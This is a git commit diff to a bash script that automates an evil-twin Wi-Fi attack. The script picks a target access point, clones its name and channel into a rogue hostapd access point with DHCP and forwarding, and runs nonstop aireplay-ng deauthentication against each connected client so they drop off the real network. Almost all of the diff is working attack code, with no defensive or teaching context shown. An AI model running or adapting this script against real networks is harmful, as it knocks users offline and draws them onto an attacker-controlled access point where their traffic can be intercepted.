a540762d92d0897d4a9636d8e39ceff3a85f3167
Goenae <aozorra.bluesky02@gmail.com>
2022-10-06 10:59:18 +0200

    Final stable version (WIP deauth channel issue)

--- airscript.sh
+++ airscript.sh
@@ -5,6 +5,8 @@ monitor_interface="$2" #wlan0mon
 
 clear
 
+sudo airmon-ng stop $monitor_interface
+
 sudo airmon-ng check kill
 
 sudo systemctl restart NetworkManager
@@ -24,7 +26,7 @@ input="scan-01.kismet.csv"
 #Delete first line of the file (without data)
 sed -i '1d' $input
 #Read each line
-while IFS= read -r lineairo
+while IFS= read -r line
 do
   #Parse the given line and put every datas in an array
   IFS=';' read -ra ARRAY <<< "$line"
@@ -41,9 +43,34 @@ do
 done < "$input"
 
 echo "$maxData"
-echo "$finalChannel"
 echo "$finalName"
 echo "$finalMAC"
+
+#Deauth all users of the selected AP until the end of the script
+
+sudo airmon-ng start $interface
+
+sudo timeout -s 2 80 airodump-ng $monitor_interface --bssid $finalMAC -a -w device & sleep 81
+
+#Delete line 1 to 5 (useless lines, without data wanted)
+sed -i '1,5d' device-01.csv
+
+sed -i '$d' device-01.csv
+
+#Automatically change the channel of the fake AP to match with the original
+sed -i "7s/.*/channel="$finalChannel"/" hostconf.conf
+
+#Death each user of the AP attacked
+
+while IFS= read -r line
+do
+  #Parse the given line and put every datas in an array
+  IFS=',' read -ra ARRAY <<< "$line"
+
+  sudo gnome-terminal -- bash -c "aireplay-ng --deauth 0 -a $finalMAC -c ${ARRAY[0]} $monitor_interface ; exec bash"
+
+
+done < "device-01.csv"
 
 # Creation of our AP
 sudo airmon-ng stop $monitor_interface
@@ -53,7 +80,7 @@ sed -i "5s/.*/ssid="$finalName"/" hostconf.conf
 
 number=1
 
-#Turn system on forwarding mode
+#Turn sytem on forwarding mode
 sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
 cat /proc/sys/net/ipv4/ip_forward
 echo "Echo 1 OK"
@@ -66,37 +93,13 @@ echo "iptables OK"
 sudo ip addr add 192.168.1.1/24 dev $interface
 echo "ip add OK"
 
-#Exec hostapd on another terminal
+#Execute hostapd on another terminal
 sudo gnome-terminal -- bash -c "sudo hostapd /home/mike/Documents/Secu/hostconf.conf ; exec bash"
 
 sudo rm scan-01.kismet.csv
-sudo rm scan-01.log
+sudo rm scan-01.log.csv
 
-#Exec dnsmasq on another terminal to setup DHCP
+#Exec dnsmasq on another terminal to setup dhcp
 sudo gnome-terminal -- bash -c "sudo dnsmasq -d -C host.conf ; exec bash"
 
-#Deauth all users of the selected AP until the end of the script
-
-sudo airmon-ng start $interface
-
-sudo timeout -s 2 30 airodump-ng $monitor_interface -c $finalChannel --bssid $finalMAC -a -w device & sleep 31
-
-#Delete line 1 to 5 (useless lines, without data wanted)
-sed -i '1,5d' device-01.csv
-
-sed -i '$d' device-01.csv
-
-#Automatically change the channel of the fake AP to match with the original
-sed -i "7s/.*/channel="$finalChannel"/" hostconf.conf
-
-#Death each user of the AP attacked
-while IFS= read -r line
-do
-  #Parse the given line and put every datas in an array
-  IFS=',' read -ra ARRAY <<< "$line"
-
-  #sudo gnome-terminal -- bash -c "echo $finalMAC & echo ${ARRAY[0]} & echo $finalChannel ; exec bash"
-  sudo gnome-terminal -- bash -c "aireplay-ng --deauth 0 -a $finalMAC -c ${ARRAY[0]} $monitor_interface ; exec bash"
-
-
-done < "device-01.csv"
+sudo rm device-01.cap & sudo rm device-01.csv & sudo rm device-01.kismet.netxml & sudo rm device-01.kismet.csv & sudo rm device-01.log.csv
